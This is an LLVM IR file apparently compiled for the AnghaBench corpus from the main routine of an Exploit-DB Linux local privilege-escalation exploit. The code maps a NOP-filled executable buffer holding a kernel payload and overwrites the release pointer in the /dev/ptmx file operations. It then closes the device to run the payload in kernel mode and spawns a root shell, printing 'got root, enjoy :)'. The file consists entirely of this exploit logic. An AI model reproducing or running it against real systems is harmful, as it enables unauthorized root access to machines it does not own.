; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31346.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31346.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [29 x i8] c"preparing payload buffer...\0A\00", align 1
@TTY_RELEASE = common dso_local global i32 0, align 4
@PAYLOADSIZE = common dso_local global i32 0, align 4
@kernel_payload = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [60 x i8] c"changing kernel pointer to point into controlled buffer...\0A\00", align 1
@PTMX_FOPS = common dso_local global i64 0, align 8
@FOPS_RELEASE_OFFSET = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [73 x i8] c"releasing file descriptor to call manipulated pointer in kernel mode...\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"/dev/ptmx\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"failed to get root :(\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [20 x i8] c"got root, enjoy :)\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"-sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* @TTY_RELEASE, align 4
  %11 = sext i32 %10 to i64
  %12 = and i64 %11, 1099511623680
  %13 = inttoptr i64 %12 to i8*
  %14 = load i32, i32* @PAYLOADSIZE, align 4
  %15 = call i64 @mmap(i8* %13, i32 %14, i32 7, i32 50, i32 0, i32 0)
  store i64 %15, i64* %6, align 8
  %16 = load i64, i64* %6, align 8
  %17 = inttoptr i64 %16 to i8*
  %18 = load i32, i32* @PAYLOADSIZE, align 4
  %19 = call i32 @memset(i8* %17, i32 144, i32 %18)
  %20 = load i32, i32* @PAYLOADSIZE, align 4
  %21 = sub nsw i32 %20, 1024
  %22 = sext i32 %21 to i64
  %23 = load i64, i64* %6, align 8
  %24 = add nsw i64 %23, %22
  store i64 %24, i64* %6, align 8
  %25 = load i64, i64* %6, align 8
  %26 = inttoptr i64 %25 to i8*
  %27 = call i32 @memcpy(i8* %26, i32* @kernel_payload, i32 1024)
  %28 = call i32 @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  %29 = load i64, i64* @PTMX_FOPS, align 8
  %30 = load i64, i64* @FOPS_RELEASE_OFFSET, align 8
  %31 = add nsw i64 %29, %30
  store i64 %31, i64* %7, align 8
  %32 = load i64, i64* %7, align 8
  %33 = add nsw i64 %32, 7
  %34 = call i32 @zero_out(i64 %33)
  %35 = load i64, i64* %7, align 8
  %36 = add nsw i64 %35, 6
  %37 = call i32 @zero_out(i64 %36)
  %38 = load i64, i64* %7, align 8
  %39 = add nsw i64 %38, 5
  %40 = call i32 @zero_out(i64 %39)
  %41 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8 signext 114)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = call i32 @close(i32 %43)
  %45 = call i64 (...) @getuid()
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %51

47:                                               ; preds = %2
  %48 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  %49 = load i32, i32* @EXIT_FAILURE, align 4
  %50 = call i32 @exit(i32 %49) #3
  unreachable

51:                                               ; preds = %2
  %52 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %53 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32* null)
  ret i32 %53
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @zero_out(i64) #1

declare dso_local i32 @open(i8*, i8 signext) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @getuid(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
